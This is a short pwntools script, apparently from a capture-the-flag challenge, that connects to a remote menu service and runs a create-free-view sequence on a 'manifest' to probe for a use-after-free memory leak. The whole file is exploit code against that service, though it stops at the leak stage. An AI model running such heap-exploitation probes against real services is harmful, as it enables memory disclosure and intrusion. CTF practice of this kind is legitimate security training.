from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'2')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'8')
p.recvuntil(b'data:\n')
p.send(b'A' * 16)
recv_menu()

p.sendline(b'4')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
recv_menu()

p.sendline(b'2')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
data = p.recv(1024, timeout=1)
print(data)
p.close()
